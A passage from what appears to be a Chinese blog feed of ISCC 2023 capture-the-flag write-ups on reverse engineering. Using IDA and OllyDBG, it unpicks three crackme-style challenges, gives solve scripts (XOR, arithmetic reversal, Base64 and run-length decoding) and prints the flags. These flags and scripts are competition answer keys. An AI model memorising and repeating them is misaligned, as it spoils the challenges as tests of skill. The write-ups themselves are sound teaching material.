People&#39;s Eyes3.png"><br>在 OllyDBG 中打开，定位到该位置，在 IDA 中该地址为 <code>0x004017DB</code>，在 OllyDBG 中为 <code>0x000E17DB</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-Pull%20the%20Wool%20Over%20People's%20Eyes4.png" alt="ISCC2023-Pull the Wool Over People&#39;s Eyes4.png"><br><code>F2</code> 下断点<br>直接运行程序，输入的时候随便输入即可<br>在堆栈窗口中即可看到生成的 <code>Src</code> 的值为：<code>ISCC&#123;ACYeeeloorrsuv&#125;</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-Pull%20the%20Wool%20Over%20People's%20Eyes5.png" alt="ISCC2023-Pull the Wool Over People&#39;s Eyes5.png"></p></li><li><p>跟踪 <code>Src</code> 和 <code>v35</code> 的处理过程，观察到如下代码：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-Pull%20the%20Wool%20Over%20People's%20Eyes6.png" alt="ISCC2023-Pull the Wool Over People&#39;s Eyes6.png"><br>首先将输入 <code>v35</code> 赋值给 <code>v4</code>，<code>Src</code> 赋值给 <code>v5</code><br>其中，<code>v3</code> 为 <code>v35</code> 和 <code>Src</code> 的索引，<code>v29</code> 为 <code>v6</code> 的索引<br><code>v7 = v4 + v3</code> 指向 <code>v35</code><br><code>v8 = v5 + v3</code> 指向 <code>Src</code><br><code>v6</code> 指向 <code>v35</code><br><code>*(v6 + v29) = *v8 ^ *v7</code> 将 <code>v35</code> 和 <code>Src</code> 进行异或，即 <code>v35[] = Src[] ^ v35[]</code></p></li><li><p>后面定义了一串 0 和 1 的字符串 <code>v10</code>，并用一个 while() 循环比较 <code>v9[]</code> 和 <code>v10[]</code> 的值是否相等<br>若每一位都相等，则 <code>v13 = 0</code>，输出 Right<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-Pull%20the%20Wool%20Over%20People's%20Eyes7.png" alt="ISCC2023-Pull the Wool Over People&#39;s Eyes7.png"><br>由初值 <code>v11 = 156</code>，<code>v14 = v11 &lt; 4</code>，当 <code>v11 &lt; 4</code> 时结束循环<br>结合 <code>Src = ISCC&#123;ACYeeeloorrsuv&#125;</code> 长度为 20<br><code>v10</code> 长度为 160，每 8 位二进制作为一组与 <code>Src</code> 进行异或<br>即可得到 flag</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token string">"ISCC&#123;ACYeeeloorrsuv&#125;"</span>  v10 <span class="token operator">=</span> <span class="token string">"0000000000000000000000000000000000000000011001000111001000101110001001110001010100000001000111110101110100101100000111010100101100100100010000010010000000000000"</span>  num <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>v10<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      t <span class="token operator">=</span> <span class="token string">""</span>      <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          t <span class="token operator">+=</span> v10<span class="token punctuation">[</span>i <span class="token operator">+</span> j<span class="token punctuation">]</span>      num<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>ISCC</p></blockquote>]]></content>
    
    
    <summary type="html">2023 ISCC 的一道逆向题，逻辑不算难，需要读懂伪代码逻辑，主要是耐心，对于程序生成的中间数据可以直接通过 OllyDBG 动态调试获得</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>【ISCC 2023】Convert</title>
    <link href="https://www.4ss1du0us.cn/2023/06f43ef1b7.html"/>
    <id>https://www.4ss1du0us.cn/2023/06f43ef1b7.html</id>
    <published>2023-06-09T02:08:24.000Z</published>
    <updated>2023-06-30T01:42:02.274Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>逆向代码逻辑</p></li><li><p><mark>注意 IDA 伪代码中有一些数据的一部分会用其他变量来表示，记得拼接</mark></p></li></ul><hr><p><a href="https://iscc.isclab.org.cn/">（2023年5月1日-2023年5月25日）【ISCC 2023】Convert</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>定位到主函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-Convert1.png" alt="ISCC2023-Convert1.png"><br>分析可知<br><code>sub_4865AD(&amp;unk_5DC488, &amp;byte_5A04DC)</code> 为 <code>printf(&quot;请输入flag：\n&quot;)</code><br><code>sub_484D2F(&amp;dword_5DC3E0, v5)</code> 为 <code>scanf(&quot;%s&quot;, v5)</code><br>逻辑比较简单，就是将输入 <code>v5</code> 进行处理后与 <code>v8</code> 进行比较，如果相同则获得 flag</p></li><li><p>主要的处理逻辑在 <code>sub_488B0A(v5, v7, v6)</code> 中，<code>sub_488B0A(v5, v7, v6)</code> 会调用 <code>sub_499080(a1, a2, a3)</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-Convert2.png" alt="ISCC2023-Convert2.png"><br>这里的逻辑也不复杂，直接将这个算法逆过来即可</p></li><li><p>注意伪代码中的 <code>v9</code>，其实也是密文的一部分<br>完整的密文内容为 <code>v8</code> 和 <code>v9</code></p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span>  </span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>  <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">char</span> v7<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+10Ch] [ebp-30h] BYREF  </span>    <span class="token keyword">char</span> v8<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+118h] [ebp-24h] BYREF  </span>    v8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'('</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'0'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'$'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'$'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'b'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">25</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">14</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">42</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">37</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">85</span><span class="token punctuation">;</span>        v8<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'B'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'D'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'W'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'G'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\''</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'*'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'*'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token char">'5'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">':'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'s'</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> <span class="token string">"ISCC"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> v6 <span class="token operator">=</span> <span class="token number">23</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>          v8<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">-=</span> v7<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">;</span>          v8<span class="token punctuation">[</span><span class="token number">12</span> <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">-=</span> v8<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">+</span> j<span class="token punctuation">]</span><span class="token punctuation">;</span>          v8<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">2</span> <span class="token operator">*</span> j<span class="token punctuation">;</span>          v8<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">-=</span> v7<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">;</span>          v8<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">-=</span> j <span class="token operator">^</span> <span class="token operator">-</span><span class="token punctuation">(</span>v7<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> v6 <span class="token punctuation">)</span>              <span class="token keyword">break</span><span class="token punctuation">;</span>          v8<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-=</span> i<span class="token punctuation">;</span>          v8<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">32</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">24</span><span class="token punctuation">;</span> <span class="token operator">++</span>k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> v8<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>ISCC{1!&amp;&amp;?7!]&lt;MYI&amp;+*AE}</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-Convert3.png" alt="ISCC2023-Convert3.png"></p>]]></content>
    
    
    <summary type="html">2023 ISCC 的一道逆向题，这个题比较简单，主要是对代码逻辑的逆向，但是要注意有些数据不要掉了，IDA 伪代码中有一些数据的一部分会用其他变量来表示</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>【ISCC 2023】变形记</title>
    <link href="https://www.4ss1du0us.cn/2023/0638e84743.html"/>
    <id>https://www.4ss1du0us.cn/2023/0638e84743.html</id>
    <published>2023-06-08T01:23:24.000Z</published>
    <updated>2023-06-30T01:41:44.412Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>熟悉伪代码中 Base64 算法的不同实现方法</mark></p></li><li><p>熟悉一些逆向的代码逻辑</p></li></ul><hr><p><a href="https://iscc.isclab.org.cn/">（2023年5月1日-2023年5月25日）【ISCC 2023】变形记</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>定位到主函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B01.png" alt="ISCC2023-变形记1.png"><br>查看字符串：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B02.png" alt="ISCC2023-变形记2.png"><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B03.png" alt="ISCC2023-变形记3.png"><br>发现形似 Base64 加密的字符串和 Base64 加密的码表</p></li><li><p>跟进码表位置：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B04.png" alt="ISCC2023-变形记4.png"><br>这里先将 Base64 码表 <code>BASE64_table_404200</code> 赋值给了 <code>v6</code> 和 <code>v56</code><br>由于每一步 <code>if else</code> 都会执行 <code>sub_401960()</code> 函数，跟进：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B05.png" alt="ISCC2023-变形记5.png"><br>该函数的作用是在堆上分配一段新的内存空间，并将原始数据从源地址复制到新分配的内存中<br>即：该函数可用于扩展内存空间并复制数据</p></li><li><p>根据 <code>sub_401180()</code> 代码中的替换规则：</p></li></ol><table><thead><tr><th align="left">步骤</th><th align="left">代码</th></tr></thead><tbody><tr><td align="left">一：第一个字符右移 2 位，取前 6 位作为索引值，查找对应字符</td><td align="left"><code>v10 = v6[*(v7 - 2) &gt;&gt; 2]</code><br><code>sub_401960(Src, v8, v48, v10)</code><br></td></tr><tr><td align="left">二：第一个字符取后 2 位与第二个字符的前 4 位拼接，查找对应字符</td><td align="left"><code>v13 = 16 * (*(v7 - 2) &amp; 3)</code><br><code>v31 = v56[v13]</code><br><code>sub_401960(Src, v32, v42, v31)</code><br><br><code>v14 = v56[v13 + (*(v7 - 1) &gt;&gt; 4)]</code><br><code>sub_401960(Src, v15, v47, v14)</code><br></td></tr><tr><td align="left">三：第二个字符取后 4 位与第三个字符的前 2 位拼接，查找对应字符</td><td align="left"><code>v18 = 4 * (*(v7 - 1) &amp; 0xF)</code><br><code>v26 = v56[v18]</code><br><code>sub_401960(Src, v27, v44, v26)</code><br><br><code>v19 = v56[v18 + (*v7 &gt;&gt; 6)]</code><br><code>sub_401960(Src, v20, v46, v19)</code><br></td></tr><tr><td align="left">四：第三个字符取后 6 位作为索引，查找对应字符</td><td align="left"><code>v23 = v56[*v7 &amp; 0x3F]</code><br><code>sub_401960(Src, v24, v45, v56[*v7 &amp; 0x3F])</code><br></td></tr></tbody></table><p>符合 Base64 加密的算法逻辑<br>所以 <code>sub_401180()</code> 函数其实就是 <code>Base64Encode()</code><br>即：主函数中 <code>sub_4014C0(v39, Block, v17, v32)</code> 进行的是 Base64 加密</p><ol start="4"><li><p>分析可知 <code>sub_401820()</code> 为 <code>strcpy()</code> 函数<br>存在 Base64 的字符串：<code>=onQzpXUjFldhl3YWpnVyEWe6Jke</code><br>后面这一段代码进行了字符串的反转：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B06.png" alt="ISCC2023-变形记6.png"><br><code>v37[]</code> 存储的是 <code>=onQzpXUjFldhl3YWpnVyEWe6Jke</code>，<code>v49[]</code> 是一个新的数组，<code>v18</code> 为 <code>v37[]</code> 的长度，<code>v20</code> 为索引位置，<code>v49[v20 - 2] = *(v22 + v18 - v20 - 1)</code> 将 <code>v37[]</code> 反向复制到 <code>v49[]</code></p></li><li><p>于是使用 <a href="http://gv99.com/text/string2reverse.html">在线字符串反转</a> 反向并进行 Base64 解密发现解密成功：<code>zBzya2VzVcyavQcQzsBz</code><br>但是 <code>ISCC&#123;zBzya2VzVcyavQcQzsBz&#125;</code> 结果不对</p></li><li><p>发现在前面还有一段代码：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B07.png" alt="ISCC2023-变形记7.png"></p></li></ol><p>其中：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        v13 <span class="token operator">=</span> v37<span class="token punctuation">;</span>        v14 <span class="token operator">=</span> v37<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v39 <span class="token operator">>=</span> <span class="token number">0x10</span> <span class="token punctuation">)</span>          v13 <span class="token operator">=</span> v9<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v39 <span class="token operator">>=</span> <span class="token number">0x10</span> <span class="token punctuation">)</span>          v14 <span class="token operator">=</span> v9<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> v11<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">*</span><span class="token punctuation">(</span>v14 <span class="token operator">+</span> v11 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token operator">++</span>v12<span class="token punctuation">;</span>LABEL_37<span class="token operator">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v11 <span class="token operator">>=</span> v38 <span class="token punctuation">)</span>          <span class="token keyword">goto</span> LABEL_38<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置了两个指针 <code>v13</code> 和 <code>v14</code>，用于寻找两个相同且相邻的元素<br>如果遇到两个相同且相邻的元素，就累加重复次数 <code>v12</code>，直到遇到不相等的元素为止</p><p>并且：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">LABEL_37<span class="token operator">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v11 <span class="token operator">>=</span> v38 <span class="token punctuation">)</span>          <span class="token keyword">goto</span> LABEL_38<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      v15 <span class="token operator">=</span> v37<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v39 <span class="token operator">>=</span> <span class="token number">0x10</span> <span class="token punctuation">)</span>        v15 <span class="token operator">=</span> v9<span class="token punctuation">;</span>      v49<span class="token punctuation">[</span>v10 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>v15 <span class="token operator">+</span> v11<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v12 <span class="token operator">&lt;</span> <span class="token number">10</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token operator">++</span>v10<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v12 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>LABEL_36<span class="token operator">:</span>          v12 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token keyword">goto</span> LABEL_37<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>        v49<span class="token punctuation">[</span>v10 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v12 <span class="token operator">/</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">;</span>        v10 <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      v9 <span class="token operator">=</span> v37<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      v49<span class="token punctuation">[</span>v10<span class="token operator">++</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v12 <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">;</span>      <span class="token keyword">goto</span> LABEL_36<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码根据重复次数 <code>v12</code> 将重复的字母替换成对应的数字，并存储在数组 <code>v49</code> 中</p><p>换成数字的规则是：<br>① 如果重复次数 <code>v12</code> 小于 10，则直接将其转换为字符存储<br>② 如果重复次数 <code>v12</code> 大于等于 10，则将十位数和个位数分别转换为字符存储</p><ol start="7"><li><p>因此，直接将数字替换为前面一个字符即可<br>得到 flag 为：<code>ISCC&#123;zBzyaaVzVcyavQcQzsBz&#125;</code></p></li><li><p>综上所述，程序逻辑如下：<br>① 在用户输入的数据中，先将重复的字母替换成对应的数字<br>② 然后进行 Base64 加密<br>③ 再将加密后的字符串反转<br>④ 与 <code>=onQzpXUjFldhl3YWpnVyEWe6Jke</code> 进行比较，如果相等则正确</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64  ss <span class="token operator">=</span> <span class="token string">"=onQzpXUjFldhl3YWpnVyEWe6Jke"</span>  res <span class="token operator">=</span> ss<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  re <span class="token operator">=</span> <span class="token string">""</span>  re <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># Base64解密  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">)</span>  result <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>re<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>re<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">57</span><span class="token punctuation">:</span>  <span class="token comment"># 重复次数小于等于9（个位数）  </span>        tmp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>re<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span> <span class="token operator">-</span> <span class="token number">1</span>          result <span class="token operator">+=</span> re<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> tmp          <span class="token keyword">continue</span>      result <span class="token operator">+=</span> re<span class="token punctuation">[</span>i<span class="token punctuation">]</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ISCC&#123;"</span> <span class="token operator">+</span> result <span class="token operator">+</span> <span class="token string">"&#125;"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 